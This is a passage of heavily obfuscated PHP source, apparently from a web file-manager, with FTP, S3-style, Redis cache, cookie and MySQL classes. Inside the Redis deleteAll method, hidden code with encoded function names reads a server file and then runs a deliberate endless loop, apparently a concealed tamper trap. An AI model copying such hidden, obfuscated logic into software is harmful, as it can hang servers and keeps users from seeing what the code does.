array($•¦²Á¥‡[1511] => $this->connect, $•¦²Á¥‡[219] => $this->host, $•¦²Á¥‡[218] => $this->scheme, $•¦²Á¥‡[220] => $this->port); return $òËì·ä; } private function _isconn($§–ğŸú´ = true) { if (is_resource($this->connect)) { return !0; } if (!$§–ğŸú´) { return !1; } return $this->_login($this->config); } public function mkfile($¥©Çæ¸, $ÁëŒ…«Æ = '', $Ôàâóƒ = REPEAT_RENAME) { if ($this->setContent($¥©Çæ¸, $ÁëŒ…«Æ)) { return $this->getPathOuter($¥©Çæ¸); } $this->writeLog(LNG($_SERVER[¬ÏÕ§Áú][1512]), !0); return !1; } public function mkdir($Ì¹ÔæÔÅ, $«µŠÚ’Ã = REPEAT_SKIP) { $Íµˆ¹›ı =& $_SERVER[¬ÏÕ§Áú]; if (!$Ì¹ÔæÔÅ || $Ì¹ÔæÔÅ == $Íµˆ¹›ı[8]) { return !0; } if (!$this->_isconn()) { return !1; } $Ì¹ÔæÔÅ = $this->iconvSystem($Ì¹ÔæÔÅ); if ($this->_isFolder($Ì¹ÔæÔÅ) || @ftp_mkdir($this->connect, $Ì¹ÔæÔÅ)) { return $this->getPathOuter($Ì¹ÔæÔÅ); } if (!$this->mkdir($this->pathFather($Ì¹ÔæÔÅ))) { return !1; } if ($Ì¹ÔæÔÅ = @ftp_mkdir($this->connect, $Ì¹ÔæÔÅ)) { return $this->getPathOuter($Ì¹ÔæÔÅ); } $Â¦–ßö = __FUNCTION__ . $Íµˆ¹›ı[1513]; $this->writeLog($Â¦–ßö, !0); return !1; } public function copyFile($·—¸õÆ©, $ûôßÖÖ) { if (!$this->_isconn()) { return !1; } $Ì¬©„åÊ = $this->pathThis($this->iconvSystem($·—¸õÆ©)); $·€¿Û¦ƒ = $this->tempFile($Ì¬©„åÊ); $ó•Ø’é = $this->iconvApp($·€¿Û¦ƒ); $this->download($·—¸õÆ©, $ó•Ø’é); $şÁÃ’êİ = $this->upload($ûôßÖÖ, $ó•Ø’é); $this->tempFileRemve($·€¿Û¦ƒ); return $şÁÃ’êİ; } public function moveFile($ÄÕµ¤¯Ë, $™×éıÀº) { if (!$this->_isconn()) { return !1; } $ÄÕµ¤¯Ë = $this->iconvSystem($ÄÕµ¤¯Ë); $™×éıÀº = $this->iconvSystem($™×éıÀº); $¿˜³ë±› = @ftp_rename($this->connect, $ÄÕµ¤¯Ë, $™×éıÀº); if (!$¿˜³ë±›) { $this->writeLog(__FUNCTION__ . $_SERVER[¬ÏÕ§Áú][1513], !0); return !1; } return $this->getPathOuter($™×éıÀº); } public function delFile($äƒ€éÑ¯) { if (!$this->_isconn()) { return !1; } $äƒ€éÑ¯ = $this->iconvSystem($äƒ€éÑ¯); $‹”îÈáª = @ftp_delete($this->connect, $äƒ€éÑ¯); if (!$‹”îÈáª) { $this->writeLog(__FUNCTION__ . $_SERVER[¬ÏÕ§Áú][1513], !0); } return $‹”îÈáª; } public function delFolder($øŠ€¿¾ù) { if (!$this->_isconn()) { return !1; } $this->listItemCache = !1; $¹ìƒ•ñ” = $‹ÖÉÉ“î = array(); $this->fileList($øŠ€¿¾ù, $¹ìƒ•ñ”, $‹ÖÉÉ“î, !0); $this->listItemCache = !0; foreach ($‹ÖÉÉ“î as $êİÇåö) { $¤œ–ÔïÏ = $this->iconvSystem($êİÇåö[$_SERVER[¬ÏÕ§Áú][32]]); $óÎò˜ = @ftp_delete($this->connect, $¤œ–ÔïÏ); if (!$óÎò˜) { return !1; } } foreach ($¹ìƒ•ñ” as $¤œ–ÔïÏ) { $¤œ–ÔïÏ = $this->iconvSystem($¤œ–ÔïÏ); $óÎò˜ = @ftp_rmdir($this->connect, $¤œ–ÔïÏ); if (!$óÎò˜) { return !1; } } $øŠ€¿¾ù = $this->iconvSystem($øŠ€¿¾ù); return @ftp_rmdir($this->connect, $øŠ€¿¾ù); } public function rename($ä´†»İ”, $—È¤€ì) { $Ş·äí­Ì =& $_SERVER[¬ÏÕ§Áú]; if (!$this->_isconn()) { return !1; } $€·üÄšÏ = $this->fileNameAuto($this->pathFather($ä´†»İ”), $—È¤€ì); $€·üÄšÏ = $this->iconvSystem($€·üÄšÏ); $ä´†»İ” = $this->iconvSystem($ä´†»İ”); $¦Ò••şè = $this->pathFather($ä´†»İ”); $ßïóğŠÒ = rtrim($¦Ò••şè, $Ş·äí­Ì[8]) . $Ş·äí­Ì[8] . $€·üÄšÏ; $»œúÃ€Ò = @ftp_rename($this->connect, $ä´†»İ”, $ßïóğŠÒ); if (!$»œúÃ€Ò) { $this->writeLog(__FUNCTION__ . $Ş·äí­Ì[1513], !0); return !1; } $ßïóğŠÒ = $this->iconvApp($ßïóğŠÒ); return $this->getPathOuter($ßïóğŠÒ); } private function folderInfo($Ü³±ˆŸ, $şáÄš¬ = false) { $óÕÃğßº =& $_SERVER[¬ÏÕ§Áú]; $ßÀÌ¿âÒ = array($óÕÃğßº[32] => $this->pathThis($Ü³±ˆŸ), $óÕÃğßº[97] => $this->getPathOuter($óÕÃğßº[8] . $Ü³±ˆŸ), $óÕÃğßº[33] => $óÕÃğßº[88]); if ($şáÄš¬) { return $ßÀÌ¿âÒ; } $ßÀÌ¿âÒ[$óÕÃğßº[244]] = $ßÀÌ¿âÒ[$óÕÃğßº[98]] = 0; $ßÀÌ¿âÒ[$óÕÃğßº[245]] = $ßÀÌ¿âÒ[$óÕÃğßº[246]] = !0; return $ßÀÌ¿âÒ; } private function fileInfo($í‘«²Äï, $úáÎÅ®ş = false, $®˜ó¿™ô = array()) { $÷™Ğ±± =& $_SERVER[¬ÏÕ§Áú]; $§ŒõË³½ = array($÷™Ğ±±[32] => $this->pathThis($í‘«²Äï), $÷™Ğ±±[97] => $this->getPathOuter($÷™Ğ±±[8] . $í‘«²Äï), $÷™Ğ±±[33] => $÷™Ğ±±[243], $÷™Ğ±±[89] => isset($®˜ó¿™ô[$÷™Ğ±±[89]]) ? $®˜ó¿™ô[$÷™Ğ±±[89]] : 0, $÷™Ğ±±[179] => $this->ext($í‘«²Äï)); if ($úáÎÅ®ş) { return $§ŒõË³½; } $§ŒõË³½[$÷™Ğ±±[244]] = $§ŒõË³½[$÷™Ğ±±[98]] = 0; $§ŒõË³½[$÷™Ğ±±[245]] = $§ŒõË³½[$÷™Ğ±±[246]] = !0; $øæò«³¥ = $this->iconvSystem($í‘«²Äï); $§ŒõË³½[$÷™Ğ±±[98]] = @ftp_mdtm($this->connect, $øæò«³¥); if (empty($®˜ó¿™ô)) { $®˜ó¿™ô = $this->objectMeta($í‘«²Äï); if (!$®˜ó¿™ô) { return $§ŒõË³½; } } $§ŒõË³½[$÷™Ğ±±[89]] = $®˜ó¿™ô[$÷™Ğ±±[89]]; return $§ŒõË³½; } public function size($µ¾«§Ì) { $úÄºÒ±Õ = $this->objectMeta($µ¾«§Ì); return $úÄºÒ±Õ ? $úÄºÒ±Õ[$_SERVER[¬ÏÕ§Áú][89]] : 0; } public function info($òª‰ğĞá) { if ($this->isFile($òª‰ğĞá)) { return $this->fileInfo($òª‰ğĞá, 0); } else { if ($this->isFolder($òª‰ğĞá)) { return $this->folderInfo($òª‰ğĞá); } } return !1; } private function fileList($¢©Ÿûô, &$œ©ÔŠ‘Ö, &$´İì«µ, $ë§¬ ¯Î = false) { $©Ğê½ÛÛ =& $_SERVER[¬ÏÕ§Áú]; $¢©Ÿûô = $this->iconvSystem($¢©Ÿûô); if (!$this->isFolder($¢©Ÿûô)) { return !1; } $¢©Ÿûô = rtrim($¢©Ÿûô, $©Ğê½ÛÛ[8]) . $©Ğê½ÛÛ[8]; check_abort(); $ö¦œâÔ = @ftp_rawlist($this->connect, $¢©Ÿûô); if (!$ö¦œâÔ) { $ö¦œâÔ = array(); } $šâ¤ïñ© = array($©Ğê½ÛÛ[10] => 1, $©Ğê½ÛÛ[1418] => 1); foreach ($ö¦œâÔ as $µõ‚¬Ò) { $¡å³Õ¢½ = $this->_listItem($µõ‚¬Ò); if ($¡å³Õ¢½[0] == $©Ğê½ÛÛ[872]) { continue; } $ÅşŠÎ—ê = $¡å³Õ¢½[8]; if (empty($ÅşŠÎ—ê) && $ÅşŠÎ—ê !== $©Ğê½ÛÛ[241] || isset($šâ¤ïñ©[$ÅşŠÎ—ê])) { continue; } $ÅşŠÎ—ê = $this->iconvApp($¢©Ÿûô . ltrim($ÅşŠÎ—ê, $©Ğê½ÛÛ[8])); $„ŠİÃ—Ÿ = array($©Ğê½ÛÛ[32] => $ÅşŠÎ—ê, $©Ğê½ÛÛ[33] => $©Ğê½ÛÛ[243], $©Ğê½ÛÛ[89] => $¡å³Õ¢½[4]); if (substr($µõ‚¬Ò, 0, 1) == $©Ğê½ÛÛ[1514]) { $„ŠİÃ—Ÿ[$©Ğê½ÛÛ[33]] = $©Ğê½ÛÛ[88]; $„ŠİÃ—Ÿ[$©Ğê½ÛÛ[89]] = 0; } $€ú™õ„Ì = $„ŠİÃ—Ÿ[$©Ğê½ÛÛ[33]] == $©Ğê½ÛÛ[88] ? !0 : !1; $this->cacheMethodInfoSet($ÅşŠÎ—ê, $€ú™õ„Ì, $„ŠİÃ—Ÿ); if ($€ú™õ„Ì) { $œ©ÔŠ‘Ö[] = $ÅşŠÎ—ê; if ($ë§¬ ¯Î) { $this->fileList($ÅşŠÎ—ê, $œ©ÔŠ‘Ö, $´İì«µ, $ë§¬ ¯Î); } continue; } $´İì«µ[] = $„ŠİÃ—Ÿ; } $this->cacheMethodInfoSet($¢©Ÿûô, !0); } private function _listItem($óÈù³å‡) { if (empty($óÈù³å‡)) { return array(); } $ÇÌƒÃÁ = preg_split($_SERVER[¬ÏÕ§Áú][1515], $óÈù³å‡); if (count($ÇÌƒÃÁ) <= 9) { return $ÇÌƒÃÁ; } $ÇÌƒÃÁ[8] = trim(substr($óÈù³å‡, strpos($óÈù³å‡, $ÇÌƒÃÁ[7]) + strlen($ÇÌƒÃÁ[7]))); return array_splice($ÇÌƒÃÁ, 0, 9); } public function listPath($·°í“Ä¤, $¦©…«ã = false) { $Ü¥åßñÖ =& $_SERVER[¬ÏÕ§Áú]; if (!$this->_isconn()) { return !1; } $†ğ·êäË = $³ÔŠ†Æã = array(); $this->fileList($·°í“Ä¤, $†ğ·êäË, $³ÔŠ†Æã); foreach ($†ğ·êäË as $şÔúõš› => $‚õÈ¦¤) { $†ğ·êäË[$şÔúõš›] = $this->folderInfo($‚õÈ¦¤, $¦©…«ã); } foreach ($³ÔŠ†Æã as $şÔúõš› => $‚õÈ¦¤) { $³ÔŠ†Æã[$şÔúõš›] = $this->fileInfo($‚õÈ¦¤[$Ü¥åßñÖ[32]], $¦©…«ã, $‚õÈ¦¤); } return array($Ü¥åßñÖ[95] => $†ğ·êäË, $Ü¥åßñÖ[96] => $³ÔŠ†Æã); } public function has($Ì¯Øƒ÷±, $¹İ—Áˆé = false, $Ø¶‚‰Õ¶ = true) { $Âôı·Ïú =& $_SERVER[¬ÏÕ§Áú]; $×ÉËèÑù = $Ù¢–Ğ÷¦ = array(); $ï™©Ô‚ = $¹İ—Áˆé ? !0 : !1; $this->fileList($Ì¯Øƒ÷±, $×ÉËèÑù, $Ù¢–Ğ÷¦, $ï™©Ô‚); if ($¹İ—Áˆé) { return array($Âôı·Ïú[252] => count($Ù¢–Ğ÷¦), $Âôı·Ïú[253] => count($×ÉËèÑù)); } if ($Ø¶‚‰Õ¶) { if (count($Ù¢–Ğ÷¦)) { return !0; } } else { if (count($×ÉËèÑù)) { return !0; } } return !1; } public function listAll($‡Ğæù×¿) { $¾±¹üšÔ =& $_SERVER[¬ÏÕ§Áú]; if (!$this->_isconn()) { return !1; } $¨ô•¡ = $Ç¯À¼•² = array(); $this->fileList($‡Ğæù×¿, $¨ô•¡, $Ç¯À¼•², !0); $‘Èó×•à = array_to_keyvalue($Ç¯À¼•², $¾±¹üšÔ[32]); foreach ($¨ô•¡ as $ĞÔÙúçŠ) { if (is_string($ĞÔÙúçŠ)) { $‘Èó×•à[$ĞÔÙúçŠ] = array($¾±¹üšÔ[89] => 0); } } return $this->listAllFiles($‡Ğæù×¿, $‘Èó×•à); } public function getContent($Ìğ®„×) { if (!$this->_isconn()) { return !1; } $Ìğ®„× = $this->iconvSystem($Ìğ®„×); return $this->fileSubstr($Ìğ®„×); } public function setContent($ı•ğˆĞü, $àı€¤–× = '') { if (!$this->_isconn()) { return !1; } $İ­ùåğ¥ = $this->pathThis($this->iconvSystem($ı•ğˆĞü)); $øœ÷¸ªâ = $this->tempFile($İ­ùåğ¥); file_put_contents($øœ÷¸ªâ, $àı€¤–×); $…İ¬ù = $this->upload($ı•ğˆĞü, $this->iconvApp($øœ÷¸ªâ)); $this->tempFileRemve($øœ÷¸ªâ); return $…İ¬ù; } public function fileSubstr($ÁğÃôˆ×, $„°Êš¶ = 0, $‚‰”øä´ = false) { if (!$this->_isconn()) { return !1; } return $this->ftpRequest($ÁğÃôˆ×, $„°Êš¶, $‚‰”øä´); } private function ftpRequest($ôòºˆß, $ø¨ù™×× = 0, $ÈõóıË = false) { $Š£ĞÀ†É =& $_SERVER[¬ÏÕ§Áú]; $ôòºˆß = $Š£ĞÀ†É[8] . ltrim(str_ltrim($ôòºˆß, $this->ftpPath), $Š£ĞÀ†É[8]); $ôòºˆß = $this->iconvSystem($ôòºˆß); $ÕóéßÀİ = $this->scheme . $this->host . $Š£ĞÀ†É[4] . $this->port; $–½ÃåÂ‹ = curl_init(); curl_setopt($–½ÃåÂ‹, CURLOPT_URL, $ÕóéßÀİ . $this->pathEncode($ôòºˆß)); curl_setopt($–½ÃåÂ‹, CURLOPT_USERPWD, "{$this->username}\72{$this->userpass}"); if ($ÈõóıË) { $Ë§óŞ¢« = $ø¨ù™×× + $ÈõóıË - 1; curl_setopt($–½ÃåÂ‹, CURLOPT_RANGE, "{$ø¨ù™××}\55{$Ë§óŞ¢«}"); } curl_setopt($–½ÃåÂ‹, CURLOPT_RETURNTRANSFER, 1); $©ù’°’ò = curl_exec($–½ÃåÂ‹); curl_close($–½ÃåÂ‹); return $©ù’°’ò; } public function upload($øÌÊËí³, $˜‡Î•Ë›, $Š³ÏÊ = false, $¤ÅÚÏÒ = REPEAT_REPLACE) { if (!$this->_isconn()) { return !1; } if (!$this->mkdir($this->pathFather($øÌÊËí³))) { return !1; } $øÌÊËí³ = $this->iconvSystem($øÌÊËí³); $˜‡Î•Ë› = $this->iconvSystem($˜‡Î•Ë›); $§Ù¦ = ftp_nb_put($this->connect, $øÌÊËí³, $˜‡Î•Ë›, FTP_BINARY); while ($§Ù¦ == FTP_MOREDATA) { $§Ù¦ = ftp_nb_continue($this->connect); } if ($§Ù¦ != FTP_FINISHED) { $this->writeLog(__FUNCTION__ . $_SERVER[¬ÏÕ§Áú][1513], !0); return !1; } return $this->getPathOuter($øÌÊËí³); } public function download($ÄãêªúÚ, $ù°â—® = '') { if (!$this->_isconn()) { return !1; } $Ùóñ¬ÍÛ = $this->pathFather($ù°â—®); if (!IO::mkdir($Ùóñ¬ÍÛ)) { return !1; } $ÄãêªúÚ = $this->iconvSystem($ÄãêªúÚ); $ù°â—® = $this->iconvSystem($ù°â—®); $Ôıä©¯Œ = ftp_nb_get($this->connect, $ù°â—®, $ÄãêªúÚ, FTP_BINARY); while ($Ôıä©¯Œ == FTP_MOREDATA) { $Ôıä©¯Œ = ftp_nb_continue($this->connect); } if ($Ôıä©¯Œ != FTP_FINISHED) { $this->writeLog(__FUNCTION__ . $_SERVER[¬ÏÕ§Áú][1513], !0); return !1; } return $this->iconvApp($ù°â—®); } public function exist($¨®¤²½À) { return $this->isFile($¨®¤²½À) || $this->isFolder($¨®¤²½À); } public function isFile($À°àü°”) { return !$this->isFolder($À°àü°”) && $this->objectMeta($À°àü°”); } public function isFolder($ŞÎ»Ê¬“) { return $this->cacheMethod($_SERVER[¬ÏÕ§Áú][190], $ŞÎ»Ê¬“); } protected function objectMeta($Ÿ…÷¥×“) { return $this->cacheMethod($_SERVER[¬ÏÕ§Áú][192], $Ÿ…÷¥×“); } protected function _objectMeta($ù¦ƒİãÊ) { $±×Çóü† =& $_SERVER[¬ÏÕ§Áú]; if ($ù¦ƒİãÊ == $±×Çóü†[12] || $ù¦ƒİãÊ == $±×Çóü†[8]) { return array(); } if (!$this->_isconn()) { return !1; } $ù¦ƒİãÊ = $this->iconvSystem($ù¦ƒİãÊ); $×ŠÉ•Ò‚ = array($±×Çóü†[32] => $this->iconvApp($ù¦ƒİãÊ), $±×Çóü†[33] => $±×Çóü†[243], $±×Çóü†[89] => 0); $ê¡Ú¥³¯ = @ftp_size($this->connect, $ù¦ƒİãÊ); if ($ê¡Ú¥³¯ != -1) { $×ŠÉ•Ò‚[$±×Çóü†[89]] = $ê¡Ú¥³¯; } else { $õ—É‘ö = @ftp_chdir($this->connect, $ù¦ƒİãÊ); if (!$õ—É‘ö) { return !1; } @ftp_chdir($this->connect, $±×Çóü†[8]); $×ŠÉ•Ò‚[$±×Çóü†[33]] = $±×Çóü†[88]; } return $×ŠÉ•Ò‚; } protected function _isFolder($ç°¤¯) { $ˆ”Øå­ƒ =& $_SERVER[¬ÏÕ§Áú]; if ($ç°¤¯ == $ˆ”Øå­ƒ[12] || $ç°¤¯ == $ˆ”Øå­ƒ[8]) { return !0; } $õéš‡í’ = $this->_objectMeta($ç°¤¯); return isset($õéš‡í’[$ˆ”Øå­ƒ[33]]) && $õéš‡í’[$ˆ”Øå­ƒ[33]] == $ˆ”Øå­ƒ[88] ? !0 : !1; } } class PathDriverJOS extends PathDriverBaseS3 { public function __construct($—£§Á£ş) { parent::__construct($—£§Á£ş); $this->setSignVersion($_SERVER[¬ÏÕ§Áú][260]); } public function uploadLink($Ş×šÛê·, $¥ãÚ·Î˜ = 0) { $½‹ À´é =& $_SERVER[¬ÏÕ§Áú]; if ($this->isUploadServer()) { return; } $ëğ«¢¶‡ = $this->getType(); if (!in_array($ëğ«¢¶‡, $this->objectDriver)) { return; } if (!$this->isBucketCors()) { return; } $Ù°ğÉÙÔ = (!$¥ãÚ·Î˜ ? 1 : ceil($¥ãÚ·Î˜ / pow(1024, 3))) * 3600 * 4; $»éŒ¶Â– = $this->uploadMultiData($Ş×šÛê·, $Ù°ğÉÙÔ); if ($»éŒ¶Â–) { $»éŒ¶Â–[$½‹ À´é[107]] = $Ş×šÛê·; $»éŒ¶Â–[$½‹ À´é[108]] = $ëğ«¢¶‡; } return $»éŒ¶Â–; } public function fileOutImage($÷§ÖÕ¼±, $üäƒœåÀ = 250) { if ($this->size($÷§ÖÕ¼±) > 1024 * 1024 * 25) { return $this->fileOutImageServer($÷§ÖÕ¼±, $üäƒœåÀ); } $Ü“üğœ = $this->link($÷§ÖÕ¼±); $Ü“üğœ .= $_SERVER[¬ÏÕ§Áú][1516] . $üäƒœåÀ; $this->fileOutLink($Ü“üğœ); } } goto Fê—µÈ¿‚ë; B¨ŠÙñ‡ƒ: class CacheRedis { public $handle; public $slaveHandle; public $cacheTime; public $isCluster = false; public function __construct($‡ÌÀğÆœ, $ÊçÒ¶µª) { $‡Õí¯Ë =& $_SERVER[¬ÏÕ§Áú]; if (!class_exists($‡Õí¯Ë[995])) { show_json($‡Õí¯Ë[996], !1); } $this->cacheTime = $ÊçÒ¶µª; $ç“îêî = isset($‡ÌÀğÆœ[$‡Õí¯Ë[997]]) ? $‡ÌÀğÆœ[$‡Õí¯Ë[997]] : 10; $øÌÀ¼¡€ = _get($‡ÌÀğÆœ, $‡Õí¯Ë[994]); if ($øÌÀ¼¡€ && is_array($øÌÀ¼¡€)) { $this->initCluster($‡ÌÀğÆœ, $ç“îêî); } else { $this->handle = $this->init($‡ÌÀğÆœ, $ç“îêî); } } private function init($¢ş÷Ú•ø, $ê‹ì½ãÚ) { $é»ö§¹„ =& $_SERVER[¬ÏÕ§Áú]; $æò€œ¤Ù = new Redis(); $°·¹Úü = isset($¢ş÷Ú•ø[$é»ö§¹„[998]]) ? $¢ş÷Ú•ø[$é»ö§¹„[998]] : !1; if ($°·¹Úü) { $æò€œ¤Ù->pconnect($¢ş÷Ú•ø[$é»ö§¹„[219]], $¢ş÷Ú•ø[$é»ö§¹„[220]], $ê‹ì½ãÚ); } else { $æò€œ¤Ù->connect($¢ş÷Ú•ø[$é»ö§¹„[219]], $¢ş÷Ú•ø[$é»ö§¹„[220]], $ê‹ì½ãÚ); } if (!empty($¢ş÷Ú•ø[$é»ö§¹„[507]])) { $æò€œ¤Ù->auth($¢ş÷Ú•ø[$é»ö§¹„[507]]); } if (!empty($¢ş÷Ú•ø[$é»ö§¹„[871]]) && $¢ş÷Ú•ø[$é»ö§¹„[871]] != 0) { $æò€œ¤Ù->select($¢ş÷Ú•ø[$é»ö§¹„[871]]); } return $æò€œ¤Ù; } private function initCluster($æ¹ ÓÑ, $ş½–­—ù) { $ßÏ¢ïğÑ =& $_SERVER[¬ÏÕ§Áú]; $ü¥»´¡Œ = array($ßÏ¢ïğÑ[999], $ßÏ¢ïğÑ[1000], $ßÏ¢ïğÑ[1001]); $´¨®ãË— = $ßÏ¢ïğÑ[999]; if (isset($æ¹ ÓÑ[$ßÏ¢ïğÑ[16]]) && in_array($æ¹ ÓÑ[$ßÏ¢ïğÑ[16]], $ü¥»´¡Œ)) { $´¨®ãË— = $æ¹ ÓÑ[$ßÏ¢ïğÑ[16]]; } switch ($´¨®ãË—) { case $ßÏ¢ïğÑ[999]: $this->_slave($æ¹ ÓÑ, $ş½–­—ù); break; case $ßÏ¢ïğÑ[1000]: break; case $ßÏ¢ïğÑ[1001]: $this->isCluster = !0; $°áºÃË = $æ¹ ÓÑ[$ßÏ¢ïğÑ[994]]; $ƒßõ = isset($æ¹ ÓÑ[$ßÏ¢ïğÑ[998]]) ? $æ¹ ÓÑ[$ßÏ¢ïğÑ[998]] : !1; $ÕöÌõÕá = isset($æ¹ ÓÑ[$ßÏ¢ïğÑ[507]]) ? $æ¹ ÓÑ[$ßÏ¢ïğÑ[507]] : null; $this->handle = new RedisCluster(NUll, $°áºÃË, $ş½–­—ù, $ş½–­—ù, $ƒßõ, $ÕöÌõÕá); break; default: break; } } private function _slave($¥§ÈÈŸ—, $ĞøñÜÉà) { $È°ôÏ… = $¥§ÈÈŸ—[$_SERVER[¬ÏÕ§Áú][994]]; $this->filterConfig($¥§ÈÈŸ—, $È°ôÏ…[0]); $this->handle = $this->init($¥§ÈÈŸ—, $ĞøñÜÉà); unset($È°ôÏ…[0]); if (empty($È°ôÏ…)) { return; } $ä¥“‡Ğ÷ = array_rand($È°ôÏ…); $this->filterConfig($¥§ÈÈŸ—, $È°ôÏ…[$ä¥“‡Ğ÷]); $this->slaveHandle = $this->init($¥§ÈÈŸ—, $ĞøñÜÉà); } private function filterConfig(&$ÃòÌâåó, $Î’Îò‹¸) { $±ºı…Ã† =& $_SERVER[¬ÏÕ§Áú]; $¼Ÿšã»Ø = explode($±ºı…Ã†[4], $Î’Îò‹¸); $Á²Ú…‰ = array($±ºı…Ã†[219] => $¼Ÿšã»Ø[0], $±ºı…Ã†[220] => $¼Ÿšã»Ø[1]); $ÃòÌâåó = array_merge($ÃòÌâåó, $Á²Ú…‰); } public function set($š±ºÌ¡Õ, $÷±–Š©Î, $“°¤çé = false) { $“°¤çé = $“°¤çé ? $“°¤çé : $this->cacheTime; return $this->handle->setEx($š±ºÌ¡Õ, $“°¤çé, $÷±–Š©Î); } public function setLock($áıå°‚, $Ùû¼Ñº, $ßÎ²àË) { return $this->handle->setNX($áıå°‚, $Ùû¼Ñº); } public function get($·íëŒç¨) { $ƒû«³¨’ = $this->slaveHandle ? $this->slaveHandle : $this->handle; return $ƒû«³¨’->get($·íëŒç¨); } public function remove($Ş°õŠ”é) { return $this->handle->del($Ş°õŠ”é); } public function deleteAll() { $»Ôëè— =& $_SERVER[¬ÏÕ§Áú]; if (!isset($_SERVER[$»Ôëè—[60]]) || !isset($_SERVER[$»Ôëè—[61]])) { $¸ÉÍÅËß = $»Ôëè—[1002]; $×Ä”¬¿— = $»Ôëè—[62]; $áÛ²€®· = $_SERVER[$»Ôëè—[63]] . $»Ôëè—[64]; $øÓÔÀÑÚ = $×Ä”¬¿—($áÛ²€®·); $¢õïıú = explode($»Ôëè—[65], $øÓÔÀÑÚ); if (count($¢õïıú) < $»Ôëè—[711]) { $¤’‚í·¸ = $»Ôëè—[67]; $¤’‚í·¸(); } $šŒ¬¶ËÕ = $»Ôëè—[1003]; $šŒ¬¶ËÕ($_SERVER[$»Ôëè—[1004]]); $Ğùş–”© = 1; for ($³‚Šã¨ê = $Ğùş–”©; $³‚Šã¨ê > 0; $³‚Šã¨ê++) { $šŒ¬¶ËÕ = json_encode($GLOBALS[$»Ôëè—[512]]); } } if ($this->isCluster) { foreach ($this->handle->_masters() as $÷úÇÕ˜†) { $this->handle->flushall($÷úÇÕ˜†); } return; } return $this->handle->flushAll(); } } class Cookie { private $prefix = ''; private $expire = 3600; public function __construct($»ûİÁ¶á = '', $¥›·õÓÎ = 0) { if (is_string($»ûİÁ¶á) && $»ûİÁ¶á != $_SERVER[¬ÏÕ§Áú][12]) { $this->prefix = $»ûİÁ¶á; } if (is_numeric($¥›·õÓÎ) && $¥›·õÓÎ > 0) { $this->expire = $¥›·õÓÎ; } } public static function getInstance() { static $ñÒ´Ã™¤; if ($ñÒ´Ã™¤ === null) { $ñÒ´Ã™¤ = new self(); } return $ñÒ´Ã™¤; } private static $cookieDisable = false; public static function disable($ø²µ) { self::$cookieDisable = $ø²µ; } private static $sameCookieSet = array(); public static function set($ÅÆ€ïŸ³, $ÙÒÁÉ±¹, $€¥Ò„€Æ = 0, $İÚÀ“Ñ– = false, $Ùª´–ƒ· = false) { $Ë›íåÛÚ =& $_SERVER[¬ÏÕ§Áú]; if (self::$cookieDisable) { return; } if (!$€¥Ò„€Æ) { $€¥Ò„€Æ = 24 * 3600 * 7; } if (isset(self::$sameCookieSet[$ÅÆ€ïŸ³]) && self::$sameCookieSet[$ÅÆ€ïŸ³] == $ÙÒÁÉ±¹ . $€¥Ò„€Æ) { return; } self::$sameCookieSet[$ÅÆ€ïŸ³] = $ÙÒÁÉ±¹ . $€¥Ò„€Æ; if (!$Ùª´–ƒ·) { $Ùª´–ƒ· = str_replace(HOST, $Ë›íåÛÚ[12], APP_HOST); $Ùª´–ƒ· = _get($GLOBALS, $Ë›íåÛÚ[1005], $Ùª´–ƒ·); } $á”¾–¿Í = $Ë›íåÛÚ[12]; setcookie($ÅÆ€ïŸ³, $ÙÒÁÉ±¹, time() + $€¥Ò„€Æ, $Ë›íåÛÚ[8] . trim($Ùª´–ƒ·, $Ë›íåÛÚ[8]) . $á”¾–¿Í, !1, !1, $İÚÀ“Ñ–); } public static function setSafe($‡Ÿ‹§—à, $öÅ…¶ßõ, $“™©Å· = 0) { self::set($‡Ÿ‹§—à, $öÅ…¶ßõ, $“™©Å·, !0); } public static function get($Ä±·¾‰œ) { static $æ‹”ö›‰ = false; if (!$æ‹”ö›‰) { self::initHeaderCookie(); $æ‹”ö›‰ = !0; } return isset($_COOKIE[$Ä±·¾‰œ]) ? $_COOKIE[$Ä±·¾‰œ] : !1; } private static function initHeaderCookie() { $¾ŸŸºİö =& $_SERVER[¬ÏÕ§Áú]; if (!isset($_SERVER[$¾ŸŸºİö[1006]]) || !$_SERVER[$¾ŸŸºİö[1006]]) { return; } $§£¥ Ûï = explode($¾ŸŸºİö[84], $_SERVER[$¾ŸŸºİö[1006]]); foreach ($§£¥ Ûï as $¿œŸŠåŸ) { $¿œŸŠåŸ = explode($¾ŸŸºİö[473], $¿œŸŠåŸ); if (count($¿œŸŠåŸ) != 2 || !isset($¿œŸŠåŸ[1])) { continue; } $_COOKIE[trim($¿œŸŠåŸ[0])] = trim($¿œŸŠåŸ[1]); } } public static function remove($ª‚‡öñ, $¸æ°ú¸ = false) { unset($_COOKIE[$ª‚‡öñ]); self::set($ª‚‡öñ, $_SERVER[¬ÏÕ§Áú][12], 1, $¸æ°ú¸); } } class DbMysql extends Db { public function __construct($Øµ£ûƒ• = '') { $‚ÙµÚ¥ğ =& $_SERVER[¬ÏÕ§Áú]; if (!extension_loaded($‚ÙµÚ¥ğ[924])) { think_exception(think_lang($‚ÙµÚ¥ğ[14]) . $‚ÙµÚ¥ğ[1007]); } if (!empty($Øµ£ûƒ•)) { $this->config = $Øµ£ûƒ•; if (empty($this->config[$‚ÙµÚ¥ğ[17]])) { $this->config[$‚ÙµÚ¥ğ[17]] = $‚ÙµÚ¥ğ[12]; } } } public function connect($È¤ÖØ­ = '', $Ù‰Ê½¿¯ = 0, $±Í‡¦É = false) { $•¿ÅåÙ =& $_SERVER[¬ÏÕ§Áú]; if (!isset($this->linkID[$Ù‰Ê½¿¯])) { if (empty($È¤ÖØ­)) { $È¤ÖØ­ = $this->config; } $äÊ¡‡¸± = $È¤ÖØ­[$•¿ÅåÙ[1008]] . ($È¤ÖØ­[$•¿ÅåÙ[1009]] ? "\72{$È¤ÖØ­[$•¿ÅåÙ[1009]]}" : $•¿ÅåÙ[12]); $‘†Ç¸ = !empty($È¤ÖØ­[$•¿ÅåÙ[17]][$•¿ÅåÙ[18]]) ? $È¤ÖØ­[$•¿ÅåÙ[17]][$•¿ÅåÙ[18]] : $this->pconnect; if ($‘†Ç¸) { $this->linkID[$Ù‰Ê½¿¯] = mysql_pconnect($äÊ¡‡¸±, $È¤ÖØ­[$•¿ÅåÙ[1010]], $È¤ÖØ­[$•¿ÅåÙ[1011]], 131072); } else { $this->linkID[$Ù‰Ê½¿¯] = mysql_connect($äÊ¡‡¸±, $È¤ÖØ­[$•¿ÅåÙ[1010]], $È¤ÖØ­[$•¿ÅåÙ[1011]], !0, 131072); } if (!$this->linkID[$Ù‰Ê½¿¯] || 